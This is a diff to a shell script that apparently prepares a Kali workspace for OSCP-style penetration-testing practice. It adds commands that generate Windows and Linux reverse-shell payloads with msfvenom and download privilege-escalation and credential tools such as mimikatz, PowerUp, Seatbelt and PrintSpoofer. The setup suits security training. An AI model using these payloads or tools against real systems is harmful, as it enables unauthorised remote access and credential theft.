@@ -36,6 +36,15 @@ mkdir internal/scan-udp-all
 mkdir internal/ad-02-$(echo "${ad02}" | cut -d '.' -f 4)
 mkdir internal/ad-03-$(echo "${ad03}" | cut -d '.' -f 4)
 
+# Make a directory for storing autorecon output
+mkdir autorecon
+
+# Make a directory for storing share dump results
+mkdir share_dumps
+
+# Make a tools directory
+mkdir /home/kali/tools
+
 # ------------------------------------------------------------
 # Make target files for internal and external targets
 
@@ -71,7 +80,7 @@ cd /home/kali/oscp/server
 cd /home/kali/oscp/server/payloads
 msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5555 --out winrev1.exe
 msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5556 --out winrev2.exe
-msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6666 --format elf --out linrev
+msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6666 --format elf --out linrev1
 msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6667 --format elf --out linrev2
 
 # Privesc
@@ -84,8 +93,13 @@ cp /usr/share/peass/linpeas/linpeas_linux_amd64 /home/kali/oscp/server/privesc/l
 cp /usr/share/peass/linpeas/linpeas.sh /home/kali/oscp/server/privesc/linpeas.sh
 # Mimikatz
 cp /usr/share/windows-resources/mimikatz/x64/* /home/kali/oscp/server/privesc/
-# Powercat, PowerUp, PowerView, and Seatbelt from shared folder
+# Powercat and PowerView from shared folder
 cp /home/kali/Desktop/shared/Payloads/other-privesc/* ./
+# Seatbelt
+wget https://raw.githubusercontent.com/carlospolop/winPE/refs/heads/master/binaries/seatbelt/SeatbeltNet4AnyCPU.exe -O seatbelt_4.exe --quiet
+wget https://raw.githubusercontent.com/carlospolop/winPE/refs/heads/master/binaries/seatbelt/SeatbeltNet3.5AnyCPU.exe -O seatbelt_35.exe --quiet
+# PowerUp
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1 -O powerup.ps1 --quiet
 # PrintSpoofer
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O printspoofer.exe --quiet
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O printspoofer32.exe --quiet
@@ -103,3 +117,22 @@ gunzip chisel_win.gz
 mv chisel_win chisel_win.exe
 
 # ------------------------------------------------------------
+
+# Setup Tools
+cd /home/kali/tools
+
+# Setup pipx
+python3 -m pipx ensurepath
+source ~/.zshrc
+
+# Install autorecon
+pipx install git+https://github.com/Tib3rius/AutoRecon.git
+
+# Install a tool to dump all contents of smb shares
+git clone https://github.com/p0daliraius/DumpSMBShare.git
+
+# Install enum4linux-ng
+git clone https://github.com/cddmp/enum4linux-ng.git
+cd enum4linux-ng
+source /home/kali/.venv/bin/activate
+python -m pip install -r ./requirements.txt
